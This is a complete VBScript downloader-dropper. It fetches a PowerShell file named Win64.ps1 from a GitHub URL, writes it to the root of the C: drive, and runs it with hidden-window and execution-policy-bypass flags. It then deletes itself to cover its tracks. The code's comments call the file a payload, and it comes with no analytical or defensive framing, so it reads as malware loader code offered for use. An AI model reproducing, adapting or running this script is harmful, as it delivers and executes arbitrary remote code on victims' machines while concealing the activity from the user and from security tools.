Set objShell = CreateObject("WScript.Shell")
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
Set objADO = CreateObject("ADODB.Stream")

' Download PowerShell payload
objXMLHTTP.Open "GET", "https://github.com/CodewithMubasher/Scripts/blob/main/Win64.ps1", False
objXMLHTTP.Send

If objXMLHTTP.Status = 200 Then
    ' Save to C: drive
    Set objADO = CreateObject("ADODB.Stream")
    objADO.Open
    objADO.Type = 1 'Binary
    objADO.Write objXMLHTTP.ResponseBody
    objADO.SaveToFile "C:\Win64.ps1", 2 'Overwrite
    objADO.Close
    
    ' Run PowerShell payload completely hidden
    objShell.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -File ""C:\Win64.ps1""", 0, False
End If

' Self-delete
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile WScript.ScriptFullName
